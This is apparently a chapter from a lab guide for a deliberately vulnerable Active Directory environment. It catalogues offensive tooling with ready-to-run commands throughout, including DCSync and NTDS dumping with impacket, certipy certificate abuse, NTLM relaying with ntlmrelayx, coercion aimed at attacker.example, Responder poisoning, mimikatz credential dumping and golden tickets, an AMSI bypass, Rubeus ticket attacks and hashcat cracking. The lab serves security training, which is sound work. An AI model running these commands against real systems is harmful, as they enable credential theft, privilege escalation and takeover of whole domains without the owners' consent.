# 07 — The Attacker Toolkit

Every tool you'll use in DVAD, organised by purpose, with the surface area
you actually need. This chapter is the reference you'll come back to most
often during the lab.

We don't repeat each tool's documentation. We catalog the **invocations
that matter**, the **edge cases that bite operators**, and the **decision
points** that determine which tool you reach for next. After you finish
this chapter, you should know:

- Which impacket script does what without `-h`.
- The difference between Responder, mitm6, and ntlmrelayx, and how they
  chain.
- When to reach for certipy vs Certify vs raw `certutil`.
- The split between PowerView, BloodHound, and bloodyAD for ACL work.
- The format conversions between ccache/kirbi/pfx/pem.

Each section has a "tips that save hours" subsection. Read those even if
you skim the rest — they encode the lessons that beginners pay for in
time.

---

## 7.0 (Context) Why the toolkit looks the way it does

Modern AD red-team tooling crystallised over roughly fifteen years. The
broad arc:

- **~2008** — Mimikatz appears (Benjamin Delpy). LSASS dump becomes the
  primitive everything sits on. The "I have a domain" → "I have the
  hashes" leap shrinks from days to seconds.
- **~2014** — PowerShell ecosystem matures. PowerView (Will Schroeder)
  brings AD enumeration to PowerShell, replacing dsquery / adfind for
  red teams.
- **~2016** — BloodHound (Andy Robbins, Rohan Vazarkar, Will Schroeder)
  turns AD into a graph. ACL paths that used to be invisible become
  one-click.
- **~2017** — impacket matures into "the de-facto Microsoft protocol
  toolkit in Python." Cross-platform Kerberos and DCERPC become possible
  without Windows.
- **~2018** — Rubeus (Will Schroeder, Lee Christensen) ports the
  Kerberos manipulation tooling to .NET, complementing mimikatz with a
  cleaner UX.
- **~2020** — CrackMapExec → NetExec — the "spray credentials across a
  range" tool standardises module-based protocol attacks.
- **~2021** — Certipy (Oliver Lyak) productionises ADCS attacks. The
  "Certified Pre-Owned" paper provides the conceptual frame.
- **~2022** — bloodyAD, mitm6, krbrelayx, PetitPotam, NetExec consolidate
  the protocol-level exploit primitives.
- **~2024** — ESC15, EKUwu, ESC16 keep finding new ADCS angles.

The result: a layered toolkit where each tool has a niche, and operators
chain tools rather than relying on monoliths. Cobalt Strike is one
notable monolith but it's a commercial product targeting enterprise
red-team operations; DVAD focuses on the open-source stack which any
operator can run.

This chapter walks the open-source stack. Where DVAD has a tool-specific
"gotcha" we flag it.

---

## 7.1 Install everything on a Kali box

```bash
# Kali Rolling — most are preinstalled
sudo apt update
sudo apt install -y \
    impacket-scripts python3-impacket \
    bloodhound bloodhound-python \
    netexec evil-winrm \
    mitm6 responder \
    hashcat john \
    smbclient ldap-utils \
    enum4linux-ng \
    krb5-user \
    proxychains4 \
    smbmap \
    masscan nmap

# certipy is not in Kali repos; install via pipx
pipx install certipy-ad

# nxc fallback (in case Kali's netexec lags)
pipx install netexec

# Tools that live in GitHub (clone fresh; releases lag dev)
mkdir -p ~/tools && cd ~/tools
git clone https://github.com/topotam/PetitPotam
git clone https://github.com/dirkjanm/krbrelayx
git clone https://github.com/leechristensen/SpoolSample
git clone https://github.com/Wh04m1001/DFSCoerce
git clone https://github.com/Pennyw0rth/NetExec   # latest dev
git clone https://github.com/SecureAuthCorp/impacket  # for examples/
git clone https://github.com/CravateRouge/bloodyAD   # ldap-based exploitation
git clone https://github.com/p0dalirius/Coercer     # multi-protocol coercion
git clone https://github.com/p0dalirius/pyGPOAbuse
git clone https://github.com/micahnerd/Powermad     # MAQ-based attacks helper (concept)
git clone https://github.com/ly4k/Certipy            # if pipx is fussy
git clone https://github.com/dirkjanm/adidnsdump    # ADIDNS enum
git clone https://github.com/dirkjanm/PKINITtools   # gettgtpkinit etc.
git clone https://github.com/dirkjanm/ROADtools     # Azure AD (out of scope here)
git clone https://github.com/login-securite/DonPAPI # DPAPI dump
git clone https://github.com/franc-pentest/ldeep    # ldap deep enum
```

For Windows-side tooling (binaries you upload to compromised hosts):

```bash
mkdir -p ~/winbins && cd ~/winbins
# Rubeus, Certify, SharpHound, Mimikatz, SharpUp, PowerView (.ps1)
# Download from the GhostPack releases page; mirror locally so victims
# can pull from your http.server.
```

> Caveat: many of these binaries are flagged by every modern AV. DVAD
> disables Defender so you can use unobfuscated releases. On real
> engagements you'll cross-compile / obfuscate (Garble, NimPlant, MorpyHL,
> ConfuserEx, etc.) — those techniques are out of scope for DVAD.

### Folder layout that scales

```
~/dvad/
├── tools/                # the github clones above
├── winbins/              # Windows binaries to serve to victims
├── loot/                 # creds, tickets, certs
│   ├── creds.txt
│   ├── tickets/
│   ├── certs/
│   └── ntds/
├── notes/
│   ├── recon/
│   ├── chain/            # the attack chain you're building
│   └── flags/            # captured flags by category
└── logs/                 # tee output of every command
```

A directory you can `tar` at the end of an exercise is worth a thousand
shell histories.

---

## 7.2 impacket — the swiss army knife

`impacket` is a Python library + a ton of example scripts that implement
Microsoft protocols (SMB, DCERPC, MS-DRSR, Kerberos, NTLM, MSRPC, MS-LSAD,
MS-SAMR, MS-WMI, MS-EVEN6, ...) in pure Python. Every script in
`examples/` is a tool.

### The scripts you'll use 100x

```
# Recon
impacket-GetADUsers     # enum domain users via LDAP
impacket-lookupsid      # SID enumeration via LSARPC
impacket-rpcdump        # enumerate RPC endpoints (MS-RPCSS)
impacket-samrdump       # samr-based enumeration

# Credential access
impacket-GetUserSPNs    # Kerberoast (request and dump TGS-REPs)
impacket-GetNPUsers     # AS-REP roast
impacket-secretsdump    # NTDS / SAM / LSA / SECURITY dump (local file or remote DCSync)
impacket-getTGT         # Get a TGT from password/hash/AES key
impacket-getST          # Get a service ticket; supports S4U2Self / S4U2Proxy / referrals
impacket-getPac         # Decode a PAC blob
impacket-ticketer       # Forge tickets (Silver, Golden)
impacket-ticketConverter # ccache <-> kirbi
impacket-describeTicket # parse and print a ccache contents

# Lateral
impacket-psexec         # service-based remote exec; SYSTEM
impacket-wmiexec        # WMI-based; no service noise; semi-interactive
impacket-smbexec        # SMB-based; service+pipe trick
impacket-dcomexec       # DCOM (MMC20.Application etc.); no SMB
impacket-atexec         # Scheduled tasks
impacket-mssqlclient    # MSSQL client (auth + xp_cmdshell)

# Coercion / relay
impacket-ntlmrelayx     # the relay multiplexer
impacket-petitpotam     # MS-EFSR coerce (alt to topotam's)
impacket-PrintNightmare # related; rarely needed standalone

# Computer/account management
impacket-addcomputer    # create a computer account via SAMR or LDAPS
impacket-changepasswd   # change a user password via SAMR or kpasswd
impacket-rbcd           # configure msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-Get-GPPPassword # decrypt old GPP passwords from SYSVOL

# Misc / niche
impacket-mqtt_check     # niche
impacket-keylistattack  # rodc unconstrained delegation niche
impacket-tstool         # MS-TSCH testing
impacket-reg            # remote registry edit (ALPC)
impacket-services       # SCM remote control
```

### Connection string shorthand

Almost every impacket script accepts `<domain>/<user>:<password>@<target>`
and various flags:

```
-hashes LMHASH:NTHASH        # PTH
-aesKey <hex>                # AES key (Kerberos)
-k -no-pass                  # use the Kerberos ticket in KRB5CCNAME
-dc-ip 10.10.0.10            # explicit DC IP (avoids DNS surprises)
-target-ip 10.10.0.13        # when name resolution to target is broken
-debug                       # verbose
-codec utf-8                 # for output codec issues on Windows targets
```

Example variations:

```bash
# Password auth
impacket-secretsdump corp.local/peter.parker:'DVADlab2024!'@10.10.0.10

# NTLM pass-the-hash
impacket-secretsdump -hashes :a4f49c4... corp.local/peter.parker@10.10.0.10

# Kerberos (cache must be set)
impacket-secretsdump -k -no-pass corp.local/peter.parker@dc01.corp.local

# Offline NTDS
impacket-secretsdump -system SYSTEM.save -ntds ntds.dit LOCAL

# DCSync just-krbtgt with explicit DC IP and Kerberos
KRB5CCNAME=/tmp/peter.parker.ccache \
impacket-secretsdump -k -no-pass -just-dc-user krbtgt \
        -dc-ip 10.10.0.10 corp.local/peter.parker@dc01.corp.local

# Use AES key instead of password / NT hash
impacket-secretsdump -aesKey <hex-256-bit> \
        corp.local/peter.parker@dc01.corp.local
```

### Tips that save hours

- **DNS hassles:** set `-dc-ip` and `-target-ip` explicitly. Don't rely
  on Kali's resolver. If the DC isn't in `/etc/resolv.conf`, your tools
  will silently misroute.
- **Clock skew:** Kerberos exchanges fail silently sometimes. `sudo
  ntpdate 10.10.0.10` first.
- **`-no-pass`** with `-k` is wrong order in many examples — must come
  after `-k`. Yes, argparse can be picky.
- **Hashes flag**: format is `LM:NT`. If you have only NT, prefix with
  `:`. Example: `-hashes :a4f49c4...`. With LM blank,
  `aad3b435b51404eeaad3b435b51404ee:NT` is equivalent.
- **Connection string quoting**: passwords with special chars need
  single quotes. `'DVAD$lab2024!'` is fine; `DVAD$lab2024!` will have
  shell variable expansion on `$lab2024`.
- **`-target-ip` for relay scenarios**: when relaying, the relayed
  target must be resolvable AND reachable from the attacker box. Use
  `-target-ip` to bypass any local DNS misconfig.
- **Use ipv6 with care**: impacket has some ipv6 support but it's rough.
  Stick to ipv4 unless mitm6-ing.
- **Verbose carefully**: `-debug` is a flood. Pipe into `less -R` or a
  log file.

---

## 7.3 certipy — ADCS swiss army knife

```bash
# Discover vulnerabilities (ESC1..ESC16)
certipy find \
        -u peter.parker@corp.local -p 'DVADlab2024!' \
        -dc-ip 10.10.0.10 -text -stdout

# Enroll a cert
certipy req \
        -u peter.parker@corp.local -p '...' \
        -ca CORP-CA -template ESC1Template \
        -upn Administrator@corp.local

# PKINIT with a cert
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10

# Shadow Credentials
certipy shadow auto -u peter.parker -p '...' -account 'sql01$' -dc-ip 10.10.0.10

# Modify a template (ESC4)
certipy template -u peter.parker -p '...' -dc-ip 10.10.0.10 -template VulnTemplate

# Create / modify a computer account (Certifried prep)
certipy account create -u peter.parker -p '...' -user 'EVIL$' -pass 'X!1' \
        -dns dc01.corp.local

# CA-level operations
certipy ca -u peter.parker -p '...' -ca CORP-CA -list-templates
certipy ca -u peter.parker -p '...' -ca CORP-CA -add-officer peter.parker

# Offline cert forgery from a stolen CA key
certipy forge -ca-pfx ca.pfx -upn Administrator@corp.local

# Extract private key from PFX
certipy cert -pfx admin.pfx -nocert -export
```

Important flags:

- `-dc-ip` — same as impacket.
- `-target-ip` — for the CA host when DNS is off.
- `-debug` — verbose.
- `-out` — output file name prefix.
- `-scheme http|https` — for ESC8 / ESC11 targeting.
- `-kerberos` — auth via Kerberos.
- `-key-size` — RSA key size for the CSR (default 2048).

### Tips that save hours

- **DC vs CA `-dc-ip` vs `-target-ip`**: certipy needs the DC for LDAP
  lookups and the CA for enrollment. Set both when they differ.
- **`-scheme http`** for ESC8 — by default certipy prefers HTTPS, which
  is exactly *not* the relayable path.
- **Output naming**: certipy writes `<user>.pfx`. If you've requested as
  Administrator, your output is `administrator.pfx`. Be careful when
  chaining — easy to overwrite.
- **Strong binding mode**: if PKINIT fails with `KDC_ERR_CLIENT_NOT_TRUSTED`
  or weird errors, the DC may be in mode 2 — check
  `StrongCertificateBindingEnforcement`.
- **`-application-policies`** is the ESC15 lever. Don't set it unless
  you mean to.
- **`account create` requires MachineAccountQuota > 0.** When it's 0,
  use a privileged user.

---

## 7.4 BloodHound — graph the attack surface

BloodHound visualises AD ACL/group/session graphs and finds attack paths.
Two parts:

### Collector

- **bloodhound-python** (Linux):

  ```bash
  bloodhound-python \
          -d corp.local -u peter.parker -p 'DVADlab2024!' \
          -ns 10.10.0.10 \
          -c All --zip
  ```

  Default collects: groups, sessions, localadmin, RDP, ACL, trusts, GPO,
  Container, ObjectProps. `-c All` adds LoggedOn and DCOnly.

- **SharpHound** (Windows, more accurate session data):

  ```
  PS> .\SharpHound.exe -c All --zipfilename data.zip
  ```

  Faster than bloodhound-python and gets richer session info because it
  can use NetSessionEnum locally.

- **azurehound, rusthound, GoAD-Sharphound** — alternates with various
  speed/coverage trade-offs.

### GUI / database

- **Legacy BloodHound (BloodHound 4.x)** — Neo4j backend, Electron app.
  Run `neo4j start`, `bloodhound`, drag-drop the zip.
- **BloodHound Community Edition (BHCE)** — newer SpecterOps web-based
  rewrite. Backend is Postgres + Go service. Run via docker-compose.

DVAD works fine with either. The legacy app is more documented; CE is
faster on large datasets.

### Pre-built queries

The "Analysis" tab lists canned Cypher queries:

- "Find all Domain Admins"
- "Shortest path to Domain Admins"
- "Find principals with DCSync rights"
- "Find computers with unconstrained delegation"
- "Find Kerberoastable users"
- "Find AS-REP roastable users"
- "Find users that can DCSync"
- "Find shortest path to Tier Zero from owned principals"

### Cypher 101

```cypher
MATCH (u {name:'ALICE@CORP.LOCAL'}), (a {name:'DOMAIN ADMINS@CORP.LOCAL'})
MATCH p=shortestPath((u)-[*1..]->(a))
RETURN p
```

Find all kerberoastable users one hop from low-priv:

```cypher
MATCH (u:User {hasspn:true})
WHERE NOT u.name STARTS WITH 'KRBTGT'
RETURN u.name, u.serviceprincipalnames
ORDER BY u.name
```

Find all users with GenericAll on Domain Admins members:

```cypher
MATCH (s)-[:GenericAll]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
RETURN s.name
```

### Tips that save hours

- **Mark owned** every user you've cracked. The "shortest path from
  owned" queries become useful.
- **Refresh after every escalation.** Paths change as you acquire new
  identities.
- **Watch for edge inflation.** SharpHound 4.x added many new edge types
  (CoerceToTGT, WriteSPN, etc.); make sure your GUI's edge filter shows
  them.
- **Local admin via group membership matters**: BloodHound's
  `AdminTo` edges come from LocalAdmin collection — they require remote
  registry, which DVAD allows.
- **Cross-trust paths**: ensure your collector ran with `-d corp.local`
  AND traversed to finance/root. `-d corp.local --search-forest` (or
  multiple collector runs) for full forest.

---

## 7.5 NetExec (formerly CrackMapExec)

The protocol surface scanner / mass auther. Pluggable modules. Default
config in `~/.nxc/nxc.conf`.

```bash
# SMB
nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'           # try creds across subnet
nxc smb 10.10.0.10 -u peter.parker -p '...' --shares             # list shares
nxc smb 10.10.0.10 -u peter.parker -p '...' --sessions           # active sessions
nxc smb 10.10.0.10 -u peter.parker -p '...' --users              # users (via SAMR)
nxc smb 10.10.0.10 -u peter.parker -p '...' --pass-pol           # password policy
nxc smb 10.10.0.10 -u peter.parker -p '...' --rid-brute          # RID-cycling

# LDAP
nxc ldap 10.10.0.10 -u peter.parker -p '...' --kerberoasting kerb.out
nxc ldap 10.10.0.10 -u peter.parker -p '...' --asreproast asrep.out
nxc ldap 10.10.0.10 -u peter.parker -p '...' --bloodhound -c All --dns-server 10.10.0.10
nxc ldap 10.10.0.10 -u peter.parker -p '...' --get-desc-users   # find passwords in description

# WinRM
nxc winrm 10.10.0.100 -u peter.parker -p '...' -x 'whoami'

# MSSQL
nxc mssql 10.10.0.14 -u sa -p 'SqlServer2025!' --local-auth -q 'select @@version'
nxc mssql 10.10.0.14 -u sa -p '...' --local-auth -x 'whoami /priv'

# RDP (auth check; no shell)
nxc rdp 10.10.0.100 -u peter.parker -p '...'

# Pass-the-hash
nxc smb 10.10.0.0/21 -u peter.parker -H <NTHASH>

# Module list
nxc smb -L                                                 # see all modules
nxc smb 10.10.0.0/21 -u peter.parker -p '...' -M zerologon -o ACTION=scan
nxc smb 10.10.0.10 -u peter.parker -p '...' -M nopac
nxc smb 10.10.0.10 -u peter.parker -p '...' -M coerce_plus
nxc smb 10.10.0.10 -u peter.parker -p '...' -M lsassy
nxc smb 10.10.0.10 -u peter.parker -p '...' -M ntdsutil
nxc smb 10.10.0.10 -u peter.parker -p '...' -M laps
nxc smb 10.10.0.10 -u peter.parker -p '...' -M gpp_password
nxc smb 10.10.0.10 -u peter.parker -p '...' -M slinky -o KEY='\\attacker\share\image.ico'
```

NetExec writes results to `~/.nxc/logs/` and a SQLite DB at
`~/.nxc/workspaces/<name>/`.

### Tips that save hours

- **`--local-auth`** queries SAM, not the domain. Use for spraying local
  admin passwords across hosts that may share one.
- **`-M lsassy`** runs LSASS dump → parse → return hashes in one shot.
  Magic.
- **`--continue-on-success`** keeps spraying when you find a hit —
  default stops at first.
- **`--jitter`** adds delay between attempts. Useful when you're worried
  about lockout.
- **Pass `-u userlist.txt -p passlist.txt`** to spray combos. Reads files
  if extension hints suggest it; otherwise force with `-u users` and
  argparse will treat as a file if exists.

---

## 7.6 evil-winrm

The de facto WinRM shell. Drop-in PowerShell remoting from Linux.

```bash
# Password
evil-winrm -i 10.10.0.10 -u peter.parker -p 'DVADlab2024!'

# PTH
evil-winrm -i 10.10.0.10 -u Administrator -H a4f49c4...

# Kerberos (cache must be set; krb5.conf configured)
KRB5CCNAME=/tmp/peter.parker.ccache \
evil-winrm -i 10.10.0.10 -u Administrator -r CORP.LOCAL

# Local scripts directory (auto-uploaded)
evil-winrm -i 10.10.0.10 -u peter.parker -p '...' \
        -s /opt/PowerView.ps1 -e /opt/binaries/

# SSL
evil-winrm -i 10.10.0.10 -u peter.parker -p '...' -S
```

Useful menu commands inside the shell:

```
*Evil-WinRM* PS> upload localfile.txt C:\Users\peter.parker\file.txt
*Evil-WinRM* PS> download C:\Path\file.txt loot/file.txt
*Evil-WinRM* PS> menu                       # show built-in cmds
*Evil-WinRM* PS> Invoke-Binary /opt/binaries/Rubeus.exe 'kerberoast /outfile:C:\users\peter.parker\k.txt'
*Evil-WinRM* PS> Bypass-4MSI                # AMSI bypass
*Evil-WinRM* PS> Donut-Loader -p Rubeus.bin # in-memory loader
*Evil-WinRM* PS> services                   # list services
```

### Tips that save hours

- **Default port is 5985 (HTTP)**, not encrypted at the WinRM layer.
  Use `-S` to switch to 5986 (HTTPS) if you care about wire confidentiality
  in the lab — packets contain plaintext when running unencrypted.
- **You're in PowerShell, not cmd.** All Windows command idioms (`dir`,
  `type`, `set`) work because PS aliases them, but `cmd.exe /c` is rarely
  needed.
- **AMSI is on by default in modern Windows** — Bypass-4MSI is a one-shot
  reflection-based bypass; works fine on DVAD because Defender's off,
  but you should still see how the bypass prints in case the real env
  has CLM or AMSI dot-source detection.
- **CLM mode**: if the shell drops into ConstrainedLanguage, many
  techniques fail. Look at `$ExecutionContext.SessionState.LanguageMode`
  on connect.
- **Logout on completion** — `exit`. Leaving sessions open leaves
  4624/4634 events.

---

## 7.7 mitm6

DHCPv6 + IPv6 DNS spoofer. Wins Windows clients' DNS by default-preferring
IPv6.

```bash
sudo mitm6 -d corp.local -i dvad-ctf
# Options:
#  -d corp.local       : domain to target
#  -i dvad-ctf         : the interface attached to the lab bridge
#  --no-ra             : don't send router advertisements
#  -hw <MAC>           : target a specific victim only
```

Combine with ntlmrelayx (it auto-points DNS at relay):

```bash
ntlmrelayx.py -wh attacker.corp.local \
              -t ldaps://dc01.corp.local --delegate-access -smb2support
```

`-wh` (WPAD host) makes ntlmrelayx serve a fake WPAD response on the
victim's queries; clients then auto-proxy through the attacker for HTTP.

### Tips that save hours

- **Run on the right interface.** Kali defaults to `eth0`; the DVAD
  bridge interface is usually `dvad-ctf` (Linux bridge).
- **mitm6 only affects Windows hosts that haven't yet pinned IPv4 DNS at
  boot.** Patience; reboot a victim or wait for the lease renewal.
- **Don't run mitm6 longer than necessary.** It interferes with
  legitimate IPv6 traffic. `Ctrl-C` cleanly to restore.

---

## 7.8 Responder

LLMNR / NBT-NS / mDNS poisoner + SMB/HTTP/FTP/LDAP capture.

```bash
sudo responder -I dvad-ctf -wrf
# -w  : web server module
# -r  : NBT-NS regular wildcards (caution; can spam)
# -f  : fingerprint hosts
# -A  : analyse mode — see what's happening without poisoning
# -P  : force Basic auth (if you want plaintext passwords)
# -v  : verbose
```

When a Windows host falls back to LLMNR (DNS lookup for a hostname that
doesn't exist), Responder replies with the attacker IP. Victim auths to
attacker's fake server with NetNTLMv2. Captured hash goes in
`/usr/share/responder/logs/`. Crack offline:

```bash
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt rockyou.txt
```

Disable SMB/HTTP listeners in `/etc/responder/Responder.conf` when chaining
with ntlmrelayx (which needs those ports):

```ini
[Responder Core]
SMB = Off
HTTP = Off
HTTPS = Off
```

### Tips that save hours

- **Analyse mode first** — `responder -I dvad-ctf -A`. Lists what
  hostnames are being requested without poisoning. You see what fake
  names to register / what to spoof more efficiently.
- **Hash format**: `username::DOMAIN:server_challenge:NTProofStr:blob`.
  Hashcat understands this as-is for mode 5600.
- **Same-host filter**: don't bother poisoning the attacker host's own
  queries. `Responder.conf` has an autoignore.
- **Lockout risk**: failed cracks won't lock anyone out, but if you then
  spray the cracked password and the user's already in a bad-pwd-count
  state, you can lock them. Check policy first.

---

## 7.9 ntlmrelayx — the swiss army of relay

```bash
# Relay SMB to SMB (need signing off on target)
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Relay HTTP coerced auth to ADCS web enrollment (ESC8)
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
              --adcs --template DomainController -smb2support

# Relay to LDAPS, grant RBCD (or dump LDAP / mod attributes)
ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support
ntlmrelayx.py -t ldaps://dc01.corp.local --dump-laps -smb2support
ntlmrelayx.py -t ldaps://dc01.corp.local --escalate-user peter.parker -smb2support

# Relay to LDAP, add shadow credential
ntlmrelayx.py -t ldap://dc01.corp.local \
              --shadow-credentials --shadow-target 'DC01$' -smb2support

# Dump secrets via relay (must relay as admin to target)
ntlmrelayx.py -t smb://server01.corp.local --secrets-dump

# General: keep socket open for SOCKS proxy access
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Then in another shell: proxychains4 smbclient //target/share
```

`--socks` keeps captured authenticated sessions and listens on 1080 for
SOCKS proxy access — you can `proxychains` other tools through. Killer
feature for long-running ops:

```
proxychains4 impacket-secretsdump corp.local/dc01\$@dc01.corp.local
```

### Tips that save hours

- **Targets file format**: one URL per line, e.g.,
  `smb://10.10.0.13`, `ldaps://dc01.corp.local`. Use the same protocol
  shorthand as `-t`.
- **`-smb2support`** is required for any modern target that doesn't
  speak SMBv1. Always pass it.
- **EPA / channel binding**: ntlmrelayx supports `--remove-mic` to strip
  Message Integrity Code (works in some downgrade scenarios). Don't
  expect miracles vs hardened LDAPS.
- **Watch the listeners**: by default ntlmrelayx binds 80 (HTTP), 445
  (SMB), and 1080 (SOCKS). Anything else listening on those ports must
  be off (kill Responder, kill any test http.server).
- **`--no-http-server` / `--no-smb-server`** lets you disable individual
  listeners if you only want one.
- **`-i`** opens an interactive shell on every relayed connection.
  Drink from the firehose.

---

## 7.10 PetitPotam / SpoolSample / DFSCoerce / Coercer

Coercion primitives. All cause a target Windows host to authenticate
(NTLM, machine account) to an attacker-controlled address.

```bash
# PetitPotam (MS-EFSR — EfsRpcOpenFileRaw and several others)
python3 PetitPotam.py \
        -d corp.local -u peter.parker -p '...' \
        attacker.example dc01.corp.local

# SpoolSample / PrinterBug (MS-RPRN)
python3 SpoolSample.py \
        target=dc01.corp.local listener=attacker.example

# DFSCoerce (MS-DFSNM)
python3 dfscoerce.py \
        -u peter.parker -p '...' -d corp.local \
        attacker.example dc01.corp.local

# Coercer (multi-protocol; tries everything)
python3 Coercer.py coerce \
        -u peter.parker -p '...' -d corp.local \
        -l attacker.example -t dc01.corp.local
```

Each is a different RPC pipe; defenders may close one and miss another.
ntlmrelayx is the listener — but you can also point at krbrelayx if you
want to do Kerberos relaying (rarely useful).

### Tips that save hours

- **Coercer first.** It probes every known method and tells you which
  works. Then use the dedicated tool for stability.
- **Use unique listener addresses.** Coercion-fired auths can stack on
  ntlmrelayx; keep them traceable.
- **MS-DFSNM** (DFSCoerce) is still unpatched. PrinterBug is partially
  patched. PetitPotam EFSR has KB5005413 but other EFSR functions remain.
- **Disable WebClient** on victim kills HTTP-based WebDAV coercion.
- **Anonymous coercion**: some methods don't need creds. Coercer flags
  which.

---

## 7.11 Mimikatz / SharpKatz / Pypykatz

Mimikatz is Windows-only. Pypykatz is the Python port for parsing offline
LSASS dumps and NTDS hives.

```bash
# Offline: parse LSASS dump
pypykatz lsa minidump lsass.dmp

# Offline: parse SAM/SYSTEM
pypykatz registry --sam SAM.save SYSTEM.save

# Offline: NTDS
pypykatz ntds /path/to/ntds.dit -t lm

# Offline: SECURITY hive
pypykatz registry --security SECURITY.save SYSTEM.save
```

For Windows-side use (when you have an interactive PS on a victim with
SeDebugPrivilege):

```
PS> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NT> /run:powershell.exe
mimikatz # lsadump::dcsync /user:krbtgt
mimikatz # lsadump::secrets
mimikatz # lsadump::sam
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<NT> /id:500 /ptt
mimikatz # crypto::certificates /systemstore:LOCAL_MACHINE /store:MY /export
mimikatz # vault::cred /patch
mimikatz # vault::list
```

### Tips that save hours

- **`privilege::debug` first.** Without SeDebugPrivilege, sekurlsa
  commands return nothing useful.
- **Run from an elevated context.** Right-click → run as admin.
- **LSA Protection (`RunAsPPL=1`)** blocks sekurlsa. Use `mimidrv.sys`
  to unprotect (lab-only; signature pinning blocks real-world use).
- **Credential Guard (`LsaCfgFlags=1`)** moves secrets into VBS-isolated
  process; mimikatz reads only encrypted blobs.
- **`sekurlsa::tickets /export`** writes ccaches you can use on Linux.
- **`misc::cmd`** opens a cmd with the current ticket — useful when you
  forge and want to immediately use.

---

## 7.12 Rubeus — Kerberos Swiss Army for Windows

C# tool. Drop on victim via Invoke-Binary or `Get-Content | iex` (if .NET
reflection wrapper).

Key commands (see Appendix Z in `WALKTHROUGH.md`):

```
Rubeus.exe asreproast /format:hashcat /outfile:r.txt
Rubeus.exe kerberoast /outfile:k.txt /nowrap
Rubeus.exe kerberoast /user:svc_iis /rc4opsec /outfile:k.txt
Rubeus.exe asktgt /user:peter.parker /password:'...' /nowrap /ptt
Rubeus.exe asktgt /user:peter.parker /rc4:<NT> /nowrap /ptt
Rubeus.exe asktgt /user:peter.parker /aes256:<key> /nowrap /ptt
Rubeus.exe s4u /user:svc /rc4:... /impersonateuser:Administrator \
              /msdsspn:cifs/file01.corp.local /ptt
Rubeus.exe tgtdeleg /nowrap
Rubeus.exe diamond /tgtdeleg /user:Administrator /krbkey:<aes256> \
              /ticketuser:Administrator /ticketuserid:500 \
              /groups:512,513,518,519,520
Rubeus.exe ptt /ticket:doIFa...
Rubeus.exe purge
Rubeus.exe describe /ticket:doIFa...
Rubeus.exe renew /ticket:doIFa...
Rubeus.exe monitor /interval:5            # watch for new TGTs in LSASS
Rubeus.exe harvest /interval:60
```

### Tips that save hours

- **`/nowrap`** strips line breaks from base64 output. Always pass it
  when piping to ptt.
- **`/ptt`** injects directly into the current logon session. No `klist
  add` needed.
- **`/ptc:<ccache>`** loads a ccache file.
- **`/dc:<hostname>`** specifies target DC.
- **`asktgt /enctype:aes256`** picks etype.
- **`tgtdeleg`** uses unconstrained-delegation-style tricks to extract
  a usable TGT from any logged-in user's session (your own).
- **`monitor`** runs in a loop listening for new logon events. Great for
  catching golden-ticket forgeries in DA-context.

---

## 7.13 hashcat — offline cracking

```bash
# NTLM (raw NT hash from secretsdump)
hashcat -m 1000  ntlm.hashes rockyou.txt

# NetNTLMv2 (Responder output)
hashcat -m 5600  netntlmv2.hash rockyou.txt

# Kerberos TGS-REP RC4 (kerberoast)
hashcat -m 13100 kerberoast.hash rockyou.txt

# Kerberos TGS-REP AES256
hashcat -m 19700 kerberoast-aes.hash rockyou.txt

# Kerberos AS-REP RC4
hashcat -m 18200 asrep.hash rockyou.txt

# Kerberos AS-REP AES256
hashcat -m 18201 asrep-aes.hash rockyou.txt

# NetNTLMv1
hashcat -m 5500  netntlmv1.hash rockyou.txt

# DCC2 (Domain Cached Credentials v2)
hashcat -m 22200 dcc2.hash rockyou.txt

# PFX password
hashcat -m 27800 pfx.hash rockyou.txt
```

Useful flags: `-a 3 ?u?l?l?l?l?l?d?d` for masks, `-r rules/best64.rule`
for rule-based, `--session=corp` to checkpoint, `-w 3` for high workload,
`--status --status-timer=5` for live progress.

### Tips that save hours

- **Hashcat eats GPU.** A laptop iGPU is fine for rockyou; serious work
  needs an actual GPU.
- **Always test the format first** with `hashcat -m <mode> hash.txt
  --identify` (some versions support `--identify`; otherwise check the
  docs for the format spec).
- **Restore sessions**: `hashcat --restore --session=corp` picks up where
  you left off after a crash.
- **Use `--username`** when your hash file includes a username field —
  cracked output then maps user → password directly.
- **Wordlist economics**: rockyou + best64 rules handles 80% of weak AD
  passwords. After that, build custom lists from the org (department
  names, mascots, years).
- **Don't crack what you can pass**: an NT hash from secretsdump is
  already useful. Crack only when you need plaintext (RDP, MSSQL Windows
  auth, network device login).

---

## 7.14 bloodyAD — LDAP write exploitation

bloodyAD operates on LDAP with surgical writes — useful for ACL abuse
paths without booting BloodHound's collector.

```bash
# Reset a user's password
bloodyAD -d corp.local -u peter.parker -p '...' --host dc01.corp.local \
        set password 'victim' 'NewPass1!'

# Add to a group
bloodyAD ... add groupMember "Domain Admins" peter.parker

# Set RBCD
bloodyAD ... add rbcd 'FILE01$' 'EVIL$'

# Grant GenericAll
bloodyAD ... add genericAll victim peter.parker

# Take ownership
bloodyAD ... set owner "AdminSDHolder" peter.parker

# Plant Shadow Credentials
bloodyAD ... add shadowCredentials 'sql01$'

# Set DontReqPreauth (AS-REP roastable)
bloodyAD ... add uac victim -f DONT_REQ_PREAUTH

# Remove UAC bit
bloodyAD ... remove uac victim -f DONT_REQ_PREAUTH

# Enumerate
bloodyAD ... get object 'CN=victim,...' --attr '*'
bloodyAD ... get search --filter '(servicePrincipalName=*)'
bloodyAD ... get writable
bloodyAD ... get dnsDump
```

### Tips that save hours

- **bloodyAD often requires LDAPS (port 636)**. Use `--use-ldaps` for
  password changes (LDAP requires TLS for password setops).
- **TLS cert validation** can fail with self-signed CAs. `--use-ldaps`
  in bloodyAD doesn't verify by default in lab usage, but read the docs
  for production.
- **`get writable`** is excellent recon: lists every object you can
  modify. Cheaper than re-running BloodHound.
- **Atomic operations**: bloodyAD changes are immediate and one-shot.
